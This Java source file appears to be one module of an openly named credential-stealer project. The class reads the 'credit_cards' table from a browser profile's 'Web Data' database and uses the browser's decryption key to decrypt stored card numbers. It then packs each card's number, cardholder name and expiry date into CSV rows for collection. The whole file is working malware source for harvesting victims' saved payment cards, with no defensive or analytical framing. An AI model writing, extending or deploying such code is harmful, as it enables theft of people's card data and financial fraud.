package com.github.shurpe.stealer.utils.browser.data;

import com.github.shurpe.stealer.utils.browser.BrowserProfile;
import com.github.shurpe.stealer.utils.Utils;

import java.sql.ResultSet;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.List;

public final class BrowserDataCCs extends BrowserData {

	public final static String CSV_HEADER = "Browser,Card Number,Name On Card,Expiration Month,Expiration Year\n";

	private final List<CreditCard> creditCards;

	public BrowserDataCCs(final BrowserProfile profile) {
		super(profile, "Web Data", "credit_cards");

		this.creditCards = new ArrayList<>();
		this.findResultSets();
	}

	@Override
	public String toCsvColumn() {
		return super.toCsvColumn(creditCards);
	}

	@Override
	public void onResultSetFound(final ResultSet rs) {
		try {
			creditCards.add(new CreditCard(rs, this.getProfile().getBrowser().getDecryptionKey()));
		} catch (SQLException ignored) {
		}
	}

	public static final class CreditCard extends Data {

		private final String cardNumber, nameOnCard;
		private final String expirationMonth, expirationYear;

		public CreditCard(final ResultSet rs, final byte[] decryptKey) throws SQLException {
			cardNumber = Utils.getEncrypted(rs, "card_number_encrypted", decryptKey);
			nameOnCard = rs.getString("name_on_card");
			expirationMonth = rs.getString("expiration_month");
			expirationYear = rs.getString("expiration_year");
		}

		public String toCsvColumn() {
			return '\"' + cardNumber + "\",\"" + nameOnCard +
							"\",\"" + expirationMonth + "\",\"" + expirationYear + "\"\n";
		}
	}
}